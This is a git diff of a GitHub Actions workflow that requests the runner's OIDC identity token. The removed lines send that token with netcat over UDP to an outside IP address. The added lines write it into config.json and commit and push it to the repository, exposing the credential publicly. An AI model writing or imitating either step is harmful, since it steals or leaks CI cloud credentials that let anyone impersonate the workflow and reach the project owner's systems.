@@ -19,14 +19,18 @@ jobs:
           TOKEN=$(curl -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "$ACTIONS_ID_TOKEN_REQUEST_URL")
           echo "$TOKEN" > oidc_token.txt
-          echo "::set-output name=oidc_token::$TOKEN"
+          echo "OIDC Token fetched and stored in oidc_token.txt."
 
-      - name: Send OIDC Token via UDP
+      - name: Write OIDC Token to Code
         run: |
-          # Define the target IP and port
-          TARGET_IP="your_target_ip"
-          TARGET_PORT=your_target_port
-
-          # Send the OIDC token via UDP
-          TOKEN=$(<oidc_token.txt)
-          echo "$TOKEN" | nc -u 101.126.12.34 8080
+          # 假设你要将 Token 写入一个特定的文件，比如 `config.json`
+          echo "{\"oidc_token\": \"$(cat oidc_token.txt)\"}" > config.json
+          echo "OIDC Token written to config.json."
+          
+      - name: Commit and push changes
+        run: |
+          git config --local user.name "Kira818"
+          git config --local user.email "731064925@qq.com"
+          git add config.json
+          git commit -m "Add OIDC Token to config.json"
+          git push
